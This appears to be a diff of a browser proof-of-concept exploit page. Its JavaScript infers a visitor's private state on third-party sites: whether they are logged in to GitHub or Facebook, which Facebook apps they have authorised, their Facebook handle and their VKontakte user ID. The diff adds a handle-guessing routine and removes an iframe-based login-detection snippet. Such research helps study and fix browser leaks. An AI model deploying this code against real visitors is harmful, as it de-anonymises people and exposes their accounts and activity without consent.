@@ -3,7 +3,6 @@
 
 var wins = []
 
-
 var postback = function(data){
   var data = data.split(',')
   var guess = data[0] == '2';
@@ -21,7 +20,6 @@ var postback = function(data){
     //wins[e.data.id].w.history.go(guess ? 1 : 2)
   }
 }
-
 
 window.onmessage=postback;
 
@@ -124,7 +122,6 @@ var data_timeout = 1000;
 
 var timeout=10000;
 
-
 var sites = {
   github: 'https://github.com/notifications',
   fb: 'https://www.facebook.com/messages/new',
@@ -146,7 +143,7 @@ for(var site in sites){
 }
 
 </textarea>
-<b><div id="deb">Log (yes means definitely yes, no means most likely no but can be mistaken because of network speed - double check!)</div></b>
+<b><div id="deb">Log (yes means 100% yes, no means most likely no but can be mistaken because of network speed - double check!)</div></b>
 
 <pre>
 Other examples (you can copy code to textarea and press Run or simply use firebug/web inspector):
@@ -159,8 +156,17 @@ check_redirect('https://www.facebook.com/dialog/oauth?client_id='+(tryapp=prompt
   debug('Authorized app '+tryapp+'  '+(guess ? 'no' : 'yes'));
 })
 
-//vkontakte ID detection
+// facebook handle detection
+var friends = ['john', 'eric', 'egor.homakov', 'alice'];
+check_redirect('http://facebook.com/profile', function(guess){
+  debug('Guessed handle: '+ (guess ? 'yes' : 'no'));
+},function(w){
+  for(var i in friends){
+    w.location = 'http://facebook.com/'+friends[i]+'#';
+  }
+})
 
+// vkontakte ID detection
 
 var vk_base = 'http://m.vk.com/photos';
 var start = parseInt(prompt('In which 100 000 your ID is? for example 12300000'));
@@ -179,7 +185,7 @@ check_redirect(vk_base, function(guess){
   debug('ID inside of '+start+'  '+(guess ? 'yes' : 'no'));
 }, get_assigner(start, start+100000))
 
-//not finished proto of exploit
+// not finished proto of exploit
 
 var get_cb = function(start){
   return function(guess){
@@ -201,31 +207,6 @@ var get_cb = function(start){
   };
 }
 
-
 get_cb(your_mln)(true)
 
-</pre>
-<hr/>
-<h1>Clickjacking URL-change detection</h1>
-
-
-
-<hr/>
-<h1>414 and X-Frame-Options based detection</h1>
-<pre>
-var a='';
-for(var i=0;i<50000;i++){a+='=';}
-
-var wait = setTimeout(function(){
-  alert('Logged in fb')
-},15000)
-
-var cb=function(){
-  clearTimeout(wait);
-  alert('Not logged in fb');
-}
-
-a='https://www.facebook.com/messages/new?'+a;
-console.log(a.length);
-document.write('<'+'iframe onload="cb()" src="'+a+'"><'+'/iframe>')
 </pre>
